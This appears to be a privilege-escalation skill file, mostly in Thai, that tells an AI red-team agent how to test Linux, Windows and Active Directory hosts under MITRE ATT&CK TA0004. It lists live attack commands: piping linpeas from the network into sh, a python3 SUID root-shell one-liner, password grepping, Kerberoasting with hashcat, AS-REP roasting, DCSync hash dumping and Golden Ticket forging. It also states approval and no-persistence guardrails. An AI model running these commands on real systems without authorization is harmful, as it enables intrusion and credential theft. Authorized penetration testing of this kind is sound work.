---
name: priv-escalation
description: การทดสอบ Privilege Escalation บน Linux และ Windows ตาม MITRE ATT&CK TA0004 ครอบคลุม SUID, sudo, unquoted service paths, token abuse และ Active Directory attacks
---

# SKILL: priv-escalation

## Purpose
จำลองการยกระดับสิทธิ์จาก low-privilege ไปสู่ root/SYSTEM/Domain Admin ตาม **MITRE ATT&CK TA0004** เพื่อประเมิน **Access Impact** จริงของช่องโหว่ที่ rt-webops พิสูจน์แล้ว ดำเนินการเฉพาะ PoC proof — ห้าม maintain persistent privileged access

## Focus Areas
- **Target:** Linux/Windows hosts, Active Directory environments
- **Frameworks:** MITRE ATT&CK TA0004 (Privilege Escalation), ISO 27001 A.9 (Access Control), OWASP Risk Rating
- **Tooling:** `linpeas.sh`, `winpeas.exe`, `impacket`, `hashcat`, `netexec`

## MITRE ATT&CK Techniques ที่ครอบคลุม

### Linux PrivEsc
| T-Code | Check | Command |
|--------|-------|---------|
| T1548.001 | SUID Binaries | `find / -perm -4000 -type f 2>/dev/null` |
| T1548.003 | Sudo Misconfiguration | `sudo -l` |
| T1053.003 | Cron Jobs (writable) | `cat /etc/crontab` + ตรวจ write perms |
| T1552.001 | Credentials in Files | `grep -r "password" /etc /home 2>/dev/null` |
| T1068 | Kernel Exploits | ตรวจ kernel version + searchsploit |

### Windows PrivEsc
| T-Code | Check | Command |
|--------|-------|---------|
| T1574.009 | Unquoted Service Path | `wmic service get name,pathname` |
| T1134.001 | Token Impersonation (SeDebug) | `whoami /priv` |
| T1547.001 | Registry Run Keys | ตรวจ `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` |
| T1552.006 | Stored Credentials (Kerberos) | `impacket-GetUserSPNs` (Kerberoasting) |
| T1558.003 | Kerberoasting | `impacket-GetUserSPNs $DOMAIN/$USER:$PASS -request` |

### Active Directory Attacks
| T-Code | Attack | Command |
|--------|--------|---------|
| T1558.003 | Kerberoasting | `impacket-GetUserSPNs -request -dc-ip $DC $DOMAIN/$USER` |
| T1558.004 | AS-REP Roasting | `impacket-GetNPUsers $DOMAIN/ -no-pass -usersfile users.txt` |
| T1003.006 | DCSync | `impacket-secretsdump $DOMAIN/$USER@$DC -hashes :$HASH` |
| T1550.001 | Golden Ticket | `impacket-ticketer` (เฉพาะเมื่อได้ krbtgt hash) |

## Workflow

### Phase 1: Automated Enumeration
```bash
# Linux — linpeas ขุด PrivEsc vectors
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>/dev/null | tee linpeas_output.txt

# ดู SUID + Sudo แบบเร็ว
find / -perm -4000 -type f 2>/dev/null
sudo -l
```

### Phase 2: Linux SUID Exploitation (PoC)
```bash
# ตัวอย่าง: python3 SUID
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# GTFOBins — หา PrivEsc วิธีมาตรฐาน
# https://gtfobins.github.io/
```

### Phase 3: Windows Unquoted Service Path
```bash
# หา unquoted paths
wmic service get name,displayname,pathname,startmode | \
  findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v '\"'

# วาง binary ใน path ที่ขาด quotes (PoC เท่านั้น)
```

### Phase 4: Kerberoasting (AD)
```bash
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request -outputfile spns.txt
hashcat -m 13100 spns.txt /usr/share/wordlists/rockyou.txt
```

### Phase 5: Report Impact
- บันทึก privilege level ที่ได้: `user → root`, `user → SYSTEM`, `user → Domain Admin`
- ระบุ C-I-A impact ตาม ISO 27001
- evidence: whoami, id, klist output

## Output Contract
- PrivEsc Path อธิบาย step-by-step พร้อม MITRE T-Code
- PoC Evidence: `id`, `whoami /all`, `klist` output
- C-I-A Impact Assessment (ISO 27001)
- Mitigation ทันที: Patch ที่ควรปิด/config ที่ต้องแก้

## Safety Guardrails
- **PoC Level Only:** แสดงว่า escalation สำเร็จ ห้าม maintain privileged session นานเกินจำเป็น
- **#approve Required:** ทุก escalation attempt ต้องได้รับ SecOps Lead อนุมัติก่อน
- **No Persistence:** ห้ามสร้าง backdoor, scheduled task, registry key ใหม่
- **Offline Cracking Only:** hashcat รันบน offline hash เท่านั้น ห้ามส่ง hash ออนไลน์
